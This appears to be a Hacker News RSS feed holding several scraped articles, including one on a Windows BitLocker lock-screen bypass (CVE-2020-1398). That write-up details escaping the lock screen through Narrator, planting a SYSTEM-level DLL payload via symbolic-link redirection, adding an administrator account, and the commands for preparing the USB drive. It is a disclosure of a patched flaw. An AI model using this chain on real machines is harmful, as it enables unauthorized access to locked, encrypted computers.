<em>usability</em>, to encourage new applications and contributions.</p><p><a href="https://neovim.io/charter/">neovim.io/charter</a></p></blockquote><p>Some of their concrete plans included</p><ul><li>improving testing, tooling, and CI to simplify maintenance, make
aggressive refactorings possible, and greatly reduce contributor friction</li><li>decoupling the core from the UI, making it possible to embed the Vim core
into browsers or IDEs (or any computer program really), also making way
for more powerful and diverse GUIs</li><li>embedding a Lua runtime and providing concurrency primitives to open the
doors for smoother, more efficient, and powerful plugins</li><li>extensive refactoring: bringing C code to modern standards (C99,
leveraging new compiler features), replacing platform-specific IO code
with libuv, removing support for legacy systems and compilers, including
automatic formatting, and fixing static analysis warnings and errors</li><li>creating a scriptable terminal emulator</li></ul><p>And they delivered it.</p><p>In a very short amount of time they were able to, and I don’t use this word
lightly, <em>revolutionize</em> Vim. The impact can be seen in Vim development,
which picked up considerably as Neovim gained ground, with features and
processes ending up being reimplemented in Vim.</p><div><p>And they aren't stopping there. Current plans include:</p><ul><li>translating all Vimscript to Lua under the hood, increasing execution
performance due to leveraging LuaJIT, a very, very fast runtime</li><li>shipping a built-in LSP client</li></ul></div><p>Neovim builds upon Vim, and the way I see it, holds the following core
values:</p><p><strong>Neovim</strong></p><ul><li>Approachability</li><li>Editing efficiency</li></ul></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/">https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/</a></em></p>]]>
            </description>
            <link>https://www.murilopereira.com/the-values-of-emacs-the-neovim-revolution-and-the-vscode-gorilla/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810427</guid>
            <pubDate>Sun, 17 Jan 2021 13:18:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[BitLocker Lockscreen Bypass]]>
            </title>
            <description>
<![CDATA[
Score 522 | Comments 114 (<a href="https://news.ycombinator.com/item?id=25810250">thread link</a>) | @rdpintqogeogsaa
<br/>
January 17, 2021 | https://secret.club/2021/01/15/bitlocker-bypass.html | <a href="https://web.archive.org/web/*/https://secret.club/2021/01/15/bitlocker-bypass.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>BitLocker is a modern data protection feature that is deeply integrated in the Windows kernel. It is used by many corporations as a means of protecting company secrets in case of theft. Microsoft recommends that you have a Trusted Platform Module which can do some of the heavy cryptographic lifting for you.</p><p>Given a Windows 10 system without known passwords and a BitLocker-protected hard drive, an administrator account could be adding by doing the following:</p><ul><li>At the sign-in screen, select “I have forgotten my password.”</li><li>Bypass the lock and enable autoplay of removable drives.</li><li>Insert a USB stick with my .exe and a junction folder.</li><li>Run executable.</li><li>Remove the thumb drive and put it back in again, go to the main screen.</li><li>From there launch narrator, that will execute a DLL payload planted earlier.</li></ul><p>Now a user account is added called hax with password “hax” with membership in Administrators. To update the list with accounts to log into, click <em>I forgot my password</em> and then return to the main screen.</p><h2 id="bypassing-the-lock-screen"> <a href="#bypassing-the-lock-screen">Bypassing the lock screen</a></h2><p>First, we select the “I have forgotten my password/PIN” option. This option launches an additional session, with an account that gets created/deleted as needed; the user profile service calls it a default-account. It will have the first available name of defaultuser1, defaultuser100000, defaultuser100001, etc.</p><p>To escape the lock, we have to use the Narrator because if we manage to launch something, we cannot see it, but using the Narrator, we will be able to navigate it. However, how do we launch something?</p><p><img src="https://secret.club/assets/bitlockerbypass/1.png" alt=""></p><p>If we smash shift 5 times in quick succession, a link to open the Settings app appears, and the link actually works. We cannot see the launched Settings app. Giving the launched app focus is slightly tricky; you have to click the link and then click a place where the launched app would be visible with the correct timing. The easiest way to learn to do it is, keep clicking the link roughly 2 times a second. The sticky keys windows will disappear. Keep clicking! You will now see a focus box is drawn in the middle of the screen. That was the Settings app, and you have to stop clicking when it gets focus.</p><p>Now we can navigate the Settings app using CapsLock + Left Arrow, press that until we reach Home. Now, when Home has focus, hold down Caps Lock and press Enter. Using CapsLock + Right Arrow navigate to Devices and CapsLock + Enter when it is in focus.</p><p><img src="https://secret.club/assets/bitlockerbypass/2.png" alt=""></p><p>Now navigate to AutoPlay, CapsLock + Enter and choose “Open Folder to view files (File Explorer).” Now insert the prepared USB drive, wait some seconds, the Narrator will announce the drive has been opened, and the window is focused. Now select the file <strong>Exploit.exe</strong> and execute it with CapsLock + Enter. That is arbitrary code execution, ladies and gentlemen, without using any passwords. However, we are limited by running as the default profile.</p><p>I have made a video with my phone, as I cannot take screenshots.</p><iframe width="560" height="315" src="https://www.youtube.com/embed/ZdsSgklRoag" frameborder="0" allowfullscreen=""></iframe><h2 id="elevation-of-privilege"> <a href="#elevation-of-privilege">Elevation of privilege</a></h2><p>When a USB stick is mounted, BitLocker will create a directory named ClientRecoveryPasswordRotation in System Volume Information and set permissions to:</p><div><div><pre><code>NT AUTHORITY\Authenticated Users:(F)
NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
</code></pre></div></div><p>To redirect the create operation, a symbolic link in the NT namespace is needed as that allows us to control the filename, and the existence of the link does not abort the operation as it is still creating the directory.</p><p>Therefore, take a USB drive and make <code>\System Volume Information</code> a mount point targeting <code>\RPC Control</code>. Then make a symbolic link in <code>\RPC Control\ClientRecoveryPasswordRotation</code> targetting <code>\??\C:\windows\system32\Narrator.exe.local</code>. If the USB stick is reinserted then the folder <code>C:\windows\system32\Narrator.exe.local</code> will be created with permissions that allows us to create a subdirectory:</p><div><div><pre><code>amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.18362.657_none_e6c5b579130e3898
</code></pre></div></div><p>Inside this subdirectory, we drop a payload DLL named <em>comctl32.dll</em>. Next time the Narrator is triggered, it will load the DLL. By the way, I chose the Narrator as that is triggerable from the login screen as a system service and is not auto-loaded, so if anything goes wrong, we can still boot.</p><h2 id="combining-them"> <a href="#combining-them">Combining them</a></h2><p>The <code>ClientRecoveryPasswordRotation</code> exploit to work requires a symbolic link in <code>\RPC Control</code>. The executable on the USB drive creates the link using two calls to <code>DefineDosDevice</code>, making the link permanent so they can survive a logout/in if needed.</p><p>Then a loop is started in which the executable will:</p><ul><li>Try to create the subdirectory.</li><li>Plant the payload <code>comctl32.dll</code> inside it.</li></ul><p>It is easy to see when the loop is running because the Narrator will move its focus box and say “access denied” every second. We can now use the link created in <code>RPC Control</code>. Unplug the USB stick and reinsert it. The writeable directory will be created in <code>System32</code>; on the next loop iteration, the payload will get planted, and exploit.exe will exit. To test if the exploit has been successful, close the Narrator and try to start it again.</p><p>If the narrator does not work, it is because the DLL is planted, and Narrator executes it, but it fails to add an account because it is launched as <code>defaultuser1</code>. When the payload is planted, you will need to click back to the login screen and start Narrator; 3 beeps should play, and a message box saying the DLL has been loaded as <code>SYSTEM</code> should show. Great! The account has been created, but it is not in the list. Press “I forgot my password” and click back to update the list.</p><p>A new account named hax should appear, with password hax.</p><p>I used these steps to arm the USB device</p><div><div><pre><code>C:\Users\jonas&gt;format D: /fs:ntfs /q
Insert new disk for drive D:
Press ENTER when ready...
-----
File System: NTFS.
Quick Formatting 30.0 GB
Volume label (32 characters, ENTER for none)?
Creating file system structures.
Format complete.
30.0 GB total disk space.
30.0 GB are available.
</code></pre></div></div><p>Now, we need to elevate to admin to delete <code>System Volume Information</code>.</p><div><div><pre><code>C:\Users\jonas&gt;d:
D:\&gt;takeown /F "System Volume Information"
</code></pre></div></div><p>This results in</p><div><div><pre><code>SUCCESS: The file (or folder): "D:\System Volume Information" now owned by user "DESKTOP-LTJEFST\jonas".
</code></pre></div></div><p>We can then</p><div><div><pre><code>D:\&gt;icacls "System Volume Information" /grant Everyone:(F)
Processed file: System Volume Information
Successfully processed 1 files; Failed processing 0 files
D:\&gt;rmdir /s /q "System Volume Information"
</code></pre></div></div><p>We will use James Forshaw’s tool (attached) to create the mount point.</p><div><div><pre><code>D:\&gt;createmountpoint "System Volume Information" "\RPC Control"
</code></pre></div></div><p>Then copy the attached exploit.exe to it.</p><div><div><pre><code>D:\&gt;copy c:\Users\jonas\source\repos\exploitKit\x64\Release\exploit.exe .
1 file(s) copied.
</code></pre></div></div><p>I disclosed this vulnerability and it was assigned CVE-2020-1398. Its patch can be found <a href="https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2020-1398">here</a></p></div></div>]]>
            </description>
            <link>https://secret.club/2021/01/15/bitlocker-bypass.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810250</guid>
            <pubDate>Sun, 17 Jan 2021 12:46:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Lex Fridman AI Podcast Search]]>
            </title>
            <description>
<![CDATA[
Score 33 | Comments 51 (<a href="https://news.ycombinator.com/item?id=25810072">thread link</a>) | @rmeinl
<br/>
January 17, 2021 | https://share.streamlit.io/rmeinl/podcast_search/app.py | <a href="https://web.archive.org/web/*/https://share.streamlit.io/rmeinl/podcast_search/app.py">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://share.streamlit.io/rmeinl/podcast_search/app.py</link>
            <guid isPermaLink="false">hacker-news-small-sites-25810072</guid>
            <pubDate>Sun, 17 Jan 2021 12:07:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Securing Your GitHub Project]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809990">thread link</a>) | @kiyanwang
<br/>
January 17, 2021 | https://marcinhoppe.com/securing-your-github-project/ | <a href="https://web.archive.org/web/*/https://marcinhoppe.com/securing-your-github-project/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>Recently I have been <a href="https://github.com/ossf/wg-vulnerability-disclosures/tree/main/docs/meeting-notes">thinking</a> and <a href="https://www.youtube.com/watch?v=aFFyQIoiis8&amp;list=PLVl2hFL_zAh92RfDsgOgNifYiuYOOMawS">talking to other people</a> about <a href="https://openssf.org/">open source security</a>. The more conversations I had, the more convinced I became that this is a <a href="https://github.com/ossf/wg-identifying-security-threats/blob/main/publications/threats-risks-mitigations/v1.1/Threats%2C%20Risks%2C%20and%20Mitigations%20in%20the%20Open%20Source%20Ecosystem%20-%20v1.1.pdf">very complex</a> topic. It is full of nuance and <a href="https://addxorrol.blogspot.com/2019/08/rashomon-of-disclosure.html">conflicting opinions</a>. It is also an area that is in need of guidance and educational content.</p><p>Making good security practices the path of least resistance is a solid way to raise the bar in this space.</p><p><a href="https://github.com/">GitHub</a> is in a very special position. It is the dominant platform for open source projects. I am very positively surprised that GitHub has been consistently adding <a href="https://github.com/security">security features</a> to the platform. I am sure they are not done yet, but today they cover a pretty broad set of capabilities that allow for strong authentication, protecting and recovering from sensitive data leaks, managing vulnerabilities in dependencies, scanning source code for potential security issues, and disclosing vulnerabilities.</p><p>Those features are great, and I want to make programmers more aware of how to use them, and when.</p><p>If you don’t know how to secure your open source project, I put together a checklist that you can use to get started.</p><ol><li><strong>Use a credential manager to protect your access credentials</strong>. Regardless of whether you use username and password or <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/connecting-to-github-with-ssh">SSH keys</a> to authenticate to GitHub, make sure to <a href="https://github.blog/2020-07-02-git-credential-manager-core-building-a-universal-authentication-experience/">protect them well</a>. Leaked credentials may allow attackers to take over your project and use it to attack your users.</li><li><strong>Configure two-factor authentication (2FA)</strong>. GitHub offers <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/securing-your-account-with-two-factor-authentication-2fa">several 2FA mechanisms</a> to provide stronger authentication. You can use one-time codes sent over <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-text-messages">text messages</a> (SMS) and <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-a-totp-mobile-app">mobile apps</a>. If you want even stronger protection, you can use <a href="https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/configuring-two-factor-authentication#configuring-two-factor-authentication-using-a-security-key">security keys</a> as your second authentication factor.</li><li><strong>Enforce signed commits</strong>. Git makes it <a href="https://medium.com/@pjbgf/spoofing-git-commits-7bef357d72f0">a little bit too easy to spoof commits</a> and allow attackers to make their code to look like yours. GitHub supports <a href="https://git-scm.com/book/en/v2/Git-Tools-Signing-Your-Work">cryptographic protection</a> against such attacks.</li><li><strong>Protect the release branch</strong>. Not all branches in your repo were created equal. Git promotes a development model where branches are cheap, and the bulk of work happens in branches. Some of them are used to release software. These branches should have additional <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-protected-branches">rules that govern who and when can merge changes</a>.</li><li><strong>Require pull request reviews and approvals</strong>. Git and GitHub are all about <a href="https://guides.github.com/introduction/flow/">enabling collaboration</a> but it does not mean that you cannot <a href="https://docs.github.com/en/free-pro-team@latest/github/collaborating-with-issues-and-pull-requests/approving-a-pull-request-with-required-reviews">control what code is merged</a>. You can and you should.</li><li><strong>Scan source code for sensitive data leaks</strong>. Mistakes happen and we sometimes commit sensitive data to public repositories. GitHub <a href="https://docs.github.com/en/free-pro-team@latest/github/administering-a-repository/about-secret-scanning#about-secret-scanning-for-public-repositories">integrates with multiple services</a> and can <a href="https://docs.github.com/en/free-pro-team@latest/developers/overview/secret-scanning">detect their leaked secrets</a>.</li><li><strong>Scrub leaked secrets from git history</strong>. Sensitive data leaked into a public GitHub repository might be out of your control. Git and GitHub allow you to contain the damage by <a href="https://git-scm.com/book/en/v2/Git-Tools-Rewriting-History">rewriting git history</a> to remove the sensitive data. It is not full remediation, but we should still do it to limit the blast radius.</li><li><strong>Only use trusted GitHub Actions</strong>. GitHub Actions are tremendously useful, but if you are not careful, you may end up running malicious or sloppy code in your build pipeline. Make sure you <a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/security-hardening-for-github-actions#using-third-party-actions">only run Actions you trust</a>.</li><li><strong>Protect the secrets used by GitHub Actions</strong>. GitHub Actions that handle software releases and deployment often require credentials to work. Make sure these credentials<a href="https://docs.github.com/en/free-pro-team@latest/actions/learn-github-actions/security-hardening-for-github-actions#using-secrets"> are appropriately protected</a>.</li><li><strong>Review project dependencies for vulnerabilities</strong>. Our code is rarely written from scratch. Modern applications are built on top of a rich ecosystem of open sources modules and packages. Some of those packages contain security vulnerabilities that may impact your code. Make sure you <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/managing-vulnerabilities-in-your-projects-dependencies">review and vet your dependencies</a>.</li><li><strong>Patch dependencies with vulnerabilities</strong>. Security vulnerabilities are discovered and disclosed every day. Plan and be prepared to patch your vulnerabilities. GitHub allows you to <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/about-dependabot-security-updates">automate much of this process using Dependabot</a>. Use it if you can.</li><li><strong>Scan project source code for vulnerabilities</strong>. Your code can have security bugs, too. Discovering vulnerabilities is still a bit more art than science but there is a lot of progress in automated source code analysis. <a href="https://securitylab.github.com/tools/codeql">GitHub CodeQL</a> is a <a href="https://docs.github.com/en/free-pro-team@latest/github/finding-security-vulnerabilities-and-errors-in-your-code/automatically-scanning-your-code-for-vulnerabilities-and-errors">state-of-the-art security analyzer</a>. At least try it out.</li><li><strong>Publish a security policy</strong>. If your project is successful, there is a chance that someone will discover a security flaw in your code. <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/adding-a-security-policy-to-your-repository">Make it easy for them to report it</a> and be very clear about what you will do with that report.</li><li><strong>Collaborate on fixes for security vulnerabilities in private forks</strong>. Working in the open means that it is impossible to hide things. And yet, sometimes you will want to work on some changes in the code in private, for example when fixing a security vulnerability. Working on a fix in the open might allow attackers to reverse engineer the bug and attack your users. GitHub provides a <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/collaborating-in-a-temporary-private-fork-to-resolve-a-security-vulnerability">mechanism to easily create a private fork of your repo</a>. Use this private fork to collaborate on a fix.</li><li><strong>Publish maintainer advisories for security fixes</strong>. Fixing a security vulnerability is no small feat and you should tell your users about it. You should do it in a way that will make it easy for them to learn about it and patch (see point 11 above). GitHub provides an <a href="https://docs.github.com/en/free-pro-team@latest/github/managing-security-vulnerabilities/publishing-a-security-advisory">easy way to publish a security advisory</a> that will be incorporated into security scanning tools that your users depend on to keep their applications secure.</li></ol><p>Completing all these tasks is a very good start. If your project is successful, you will be well equipped to handle increased expectations your users will have of the security of your code.</p><p>From the documentation, of course! GitHub has very decent docs and they cover the security features pretty well. I provided links to git and GitHub documentation wherever I could.</p><p>That said, I thought there is <a href="https://marcinhoppe.com/courses/">another way to reach a broader development community</a> to evangelize using good open source security practices. I am currently working on a <a href="https://www.pluralsight.com/">Pluralsight</a> course that demonstrates how to implement items from this checklist for a fictional open source project.</p><p>I think it is going to be a fun and engaging way to demonstrate how to implement security best practices. Stay tuned!</p>
        </div></div>]]>
            </description>
            <link>https://marcinhoppe.com/securing-your-github-project/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809990</guid>
            <pubDate>Sun, 17 Jan 2021 11:49:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mapping 18'000 Asteroids]]>
            </title>
            <description>
<![CDATA[
Score 9 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809671">thread link</a>) | @cellover
<br/>
January 17, 2021 | https://eleanorlutz.com/mapping-18000-asteroids | <a href="https://web.archive.org/web/*/https://eleanorlutz.com/mapping-18000-asteroids">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://eleanorlutz.com/mapping-18000-asteroids</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809671</guid>
            <pubDate>Sun, 17 Jan 2021 10:37:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[People that think you’re an asshole]]>
            </title>
            <description>
<![CDATA[
Score 44 | Comments 54 (<a href="https://news.ycombinator.com/item?id=25809346">thread link</a>) | @LeonW
<br/>
January 17, 2021 | https://leowid.com/the-people-that-think-youre-an-asshole/ | <a href="https://web.archive.org/web/*/https://leowid.com/the-people-that-think-youre-an-asshole/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <header>    
                
            </header>

            <section>
            <div>
                <div><p>“The people that think you’re an asshole, they already think that about you now, Leo! You might as well do what you want anyway.” This Is what my friend Ed told me when I shared with him my fears about telling some grueling stories in my upcoming book. And what people might think about me when they read it and what I’ve done so far in my life. Strangely that was a huge relief.</p>
<p>On the other hand, if they don’t think so negatively about me as I’d projected when they find out about another “outing”, it’ll probably bring us closer together. In a way, it’s a win-win.</p>
<p><a href="https://leowid.com/the-6-practices-that-influenced-my-life-the-most-over-the-past-5-years/">Radical honesty</a> is a bitch, I’m learning. It hurts so bad at times but also frees me so much.</p>
<p>I’ve since mentioned this phrase of his several times with friends and in coaching sessions in various ways: those people that you think don’t like you, they already don’t like you now. Whether you do the thing or not.</p>
<p>What this leads to is courage. Courage is the thing we find when we give up on needing to be liked. Even for a brief moment. Then we are free to do what we want to do because we want to do it. This is real freedom.</p>
<p>It’s crushing and disappointing that we can’t stay there in that state of freedom. That we retreat again after a while into the darkness and the need to be liked and wanted. That’s ok, that’s life. From there, we garner and ripen the courage yet again to go out there and not care for what others think of us.</p>
<p>Along the way, we might make some friends that encourage us in this process and that back and forth. But it’s really not necessary to be too harsh on ourselves when we realize none of these states are permanent.</p>
<p>“Cheer up! You can’t blame anyone else for the kind of world that you’re in. And if you know that “I”, in the sense of the person, the front, the ego, it really doesn’t exist. Then it won’t go to your head to badly if you wake up and discover that you’re god.” is what Alan watts said, which I feel belongs here.</p>
<p>So go out there. And don’t worry about the people you fear think of you as an asshole, they already do that now anyway. You might as well take my friend Ed’s advice and do your thing regardless. Good luck and I’m here if I can help.</p>
</div>
            </div>
        </section><section>
                <div>
                    <p><img data-src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" data-srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w" data-sizes="(max-width: 100px) 100vw, 100px" alt="" src="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg" srcset="https://leowid.com/wp-content/uploads/2020/07/Leo-Profile.jpg 400w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-300x300.jpg 300w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-150x150.jpg 150w, https://leowid.com/wp-content/uploads/2020/07/Leo-Profile-180x180.jpg 180w">
                        <span>Leo Widrich</span>
                        <span>Leo Widrich coaches extraordinary people. In his previous life, he co-founded Buffer, a $20m+ revenue software company. He also lived in Buddhist monasteries for close to two years, trained as a trauma therapist and now lives in Vienna near the forest. He tweets <a href="https://twitter.com/LeoWid">@leowid</a>. To learn about working with him, <a href="https://leowid.com/working-with-me/">go here</a>.</span>
                    </p>
                </div>
            </section><section>
        <div>
            <div><h3>Receive my most vulnerable and powerful lessons from meeting life.</h3><p>Add your details below for my weekly newsletter.</p></div>
        </div>
    </section>
        </div></div>]]>
            </description>
            <link>https://leowid.com/the-people-that-think-youre-an-asshole/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809346</guid>
            <pubDate>Sun, 17 Jan 2021 09:13:49 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why teaching programming is so difficult?]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 6 (<a href="https://news.ycombinator.com/item?id=25809333">thread link</a>) | @rukshn
<br/>
January 17, 2021 | https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Like I said in one of my previous posts, I just started my first semester in my <a href="https://ruky.me/2020/12/23/what-is-health-informatics-and-what-i-do-for-a-living/" data-type="post" data-id="85">MSc in health informatics</a>. And the first semester has a module for object oriented programming.</p>
<h2>Some history</h2>
<p>I was lucky to learn computers since I was 10 years old, even though computers were mostly used in offices and even though my parents didn’t have much knowledge in computers, they sent me to a class where they taught the basics in computing.</p>
<p>After some basics in computers, we were fist taught MS Basic, as a 11 year old, basic was an easy to understand language, me and my friends experimented in creating new programmes and it was all fun.</p>
<p>Then as the years went on we learned Pascal, C++, Visual Basic and JAVA. By 14-15 I created some interesting programs with Visual Basic and .NET. Every Saturday me and my friends at the computer class showed off to each other what they have created during the week. It was a fun time.</p>
<p>As a 15 year old one thing I failed to grasp was object oriented programming, yes I knew how to use Visual Basic, but it took me some more time to really understand the scope of Object Oriented Programming.</p>
<h2>Me trying to teach programming to doctors</h2>
<p>I went to become a doctor, but even at medical college I never lost my touch in programming, and curiosity to learn new things. I learned JavaScript, frameworks like Angular, Vue, React, and now I’m more interested in web technologies.</p>
<p>Fast forward 15 years later, I’m learning basics in Object Oriented Programming again, as a post graduate student in health informatics.</p>
<p>Even though I’m also a newbie in networking and software engineering (I never liked hardware and networking side of things as a child), because I have learned the basics of programming, I feel object oriented programming and JAVA lessons as something that comes natural to me.</p>
<p>However, the same cannot be said to some of my colleagues, whom they have not learned programming or basics in computing when they were young. This is their first time in learning object oriented programming, JAVA. Almost everyone is more than 30 years old, and some of them turn to me to explain them how to get though their JAVA assignments.</p>
<p>I constantly repeat them the fact that,</p>
<blockquote><p><strong>Don’t learn java, don’t try to memorise the java syntax, learn the principals of object oriented programming, and programming. Once you learn the concepts, you will be able to apply that to any OOP language and crate whatever you want.</strong></p></blockquote>
<p>However, they constantly find it difficult to grasp the concepts object oriented programming, and in return they also find it difficult to learn java or any other language.</p>
<p>And when I try to explain, or “<em>try to</em> <em>teach</em> them” Java they always find it difficult to understand</p>
<ul><li>What is a function/method?</li><li>What is meant by return?</li><li>What is an array? What is an index? </li><li>Why looping is so hard to understand?</li><li>What is the meaning of <em>public stat</em>ic void main()</li></ul>
<p>There are some of the usual questions I get to answer but still no matter how hard I explained to them, they always find it difficult to understand it.</p>
<h2>Why teaching programming is so difficult?</h2>
<ul><li>Maybe I’m not a good teacher</li><li>Maybe I’m trying to explain to them in a position where I’m subconsciously explaining to them thinking they also had some basic knowledge in computing when they were children.</li><li>It is a known fact that with age you lose the ability to learn new skills, is due to their age which makes it difficult for them to understand programming?</li><li>Is it because they straightaway had to go to Java instead of learning a simpler language first, like what I did as a child?</li><li>Since they are doctors I don’t think they lack the analitical capabilities in understanding the logics behind programming. </li></ul>
<p>So what makes it so difficult for them to understand programming?</p>
<h2>What should I do to make them like programming, and learn the basics in object oriented programming?</h2>
<p>I tried everything possible, </p>
<ul><li>I explained to them as simple as I can</li><li>I showed them some articles available online</li><li>I wrote some easy to understand posts by my self and emailed to them</li><li>I showed them some YouTube videos that explains object oriented programming and java </li></ul>
<p>But none of them seems to work and I don’t see a good progress in any of them.</p>
<p>What do you recommend that I should to to make them learn programming basics and JAVA? The last option is to create some basic lessons coupled with some simple exercises for them to do, instead of somewhat complex assignments given to them by the MSc program.</p>
</div></div>]]>
            </description>
            <link>https://ruky.me/2021/01/16/why-teaching-programming-is-so-difficult/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25809333</guid>
            <pubDate>Sun, 17 Jan 2021 09:10:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust's SemVer Snares: `Repr(transparent)` Super-Cut]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25809318">thread link</a>) | @lukastyrychtr
<br/>
January 17, 2021 | https://jack.wrenn.fyi/blog/semver-snares-transparent/ | <a href="https://web.archive.org/web/*/https://jack.wrenn.fyi/blog/semver-snares-transparent/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <p><a href="https://jack.wrenn.fyi/blog/semver-snares"><em>(Part of an ongoing series!)</em></a></p>
<p>In the last two posts, <code>repr(transparent)</code> provided an unusual mechanism by which safe, downstream code could inadvertently rely on the <a href="https://jack.wrenn.fyi/blog/semver-snares-size/">size</a> and <a href="https://jack.wrenn.fyi/blog/semver-snares-alignment/">alignment</a> of an upstream type. In this post, I'll recap the issue and discuss why it is tricky to fix.</p>
<p>To recap, <code>repr(transparent)</code> attribute provides a mechanism for observing the alignment of a type. The <code>repr(transparent)</code> attribute can be applied to types where:</p>
<ul>
<li>at most one field has size greater-than zero, and</li>
<li>all <em>other</em> fields have minimum alignment equal to 1</li>
</ul>
<p>...to specify that the annotated type's layout is identical to that of the non-zero-sized field.</p>
<p>Applying <code>repr(transparent)</code> to a type with more than one field of size ≥1 is a compile error:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>, </span><span>// size = 1
    </span><span>baz</span><span>: </span><span>u8  </span><span>// size = 1 (⚠)
</span><span>}
</span></code></pre>
<p>...as is applying <code>repr(transparent)</code> to a type with more than one field having alignment &gt;1:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(transparent)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: </span><span>u8</span><span>,      </span><span>// align = 1
    </span><span>baz</span><span>: [</span><span>u16</span><span>; 0] </span><span>// align = 2 (⚠)
</span><span>}
</span></code></pre>
<p><strong>At present, you should not use <code>#[repr(transparent)]</code> unless you are sure your ZST fields are <em>guaranteed</em> to have size equal to zero, and alignment equal to one.</strong></p>
<p>What would it take to fully shift this diligence from the programmer to the compiler?</p>
<h2 id="potentially-breaking-changes">Potentially-Breaking Changes</h2>
<p>To answer this, let's consider the sorts of (otherwise) non-breaking changes that can increase the alignment and size of ZSTs.</p>
<h3 id="repr-annotations"><code>repr</code> Annotations</h3>
<p>Applying a <code>repr</code> annotation to a type can alter its size and alignment. The <code>align(N)</code> modifier specifies that the annotated type will have a minimum alignment of at least <code>N</code>:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(align(2))] */
</span><span>struct </span><span>Foo;

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre>
<p>Adding <code>repr(C)</code> or <code>repr(&lt;primitive&gt;)</code> to an ZST <code>enum</code> can increase its size:</p>
<pre><code data-lang="rust"><span>// uncommenting this line breaks `Bar`:
/* #[repr(isize)] */
</span><span>enum </span><span>Foo {
  Variant
}

#[</span><span>repr</span><span>(transparent)]
</span><span>struct </span><span>Bar(</span><span>u8</span><span>, Foo);
</span></code></pre><h3 id="fields">Fields</h3>
<p>Generally speaking, it is not a breaking change to:</p>
<ul>
<li>modify or remove private fields</li>
<li>add private fields to structs marked with <code>#[non_exhaustive]</code></li>
<li>add private fields to structs that already have private fields</li>
</ul>
<p>...but, in the presence of <code>repr(transparent)</code>, all of the above changes can potentially break downstream code.</p>
<p>The minimum alignment of <code>repr(C)</code> and <code>repr(transparent)</code> types is equal to the greatest minimum alignment of its fields. Adding a &gt;1-aligned field to a 1-aligned ZST prohibits that ZST from use as a field in a <code>repr(transparent)</code> type:</p>
<pre><code data-lang="rust"><span>#[</span><span>repr</span><span>(C)]
</span><span>pub struct </span><span>Foo {
    </span><span>bar</span><span>: [</span><span>u8</span><span>; 0], </span><span>// align == 1
    // uncommenting this field breaks `Bar`:
    /* baz: [u16; 0], */ // align == 2
</span><span>}

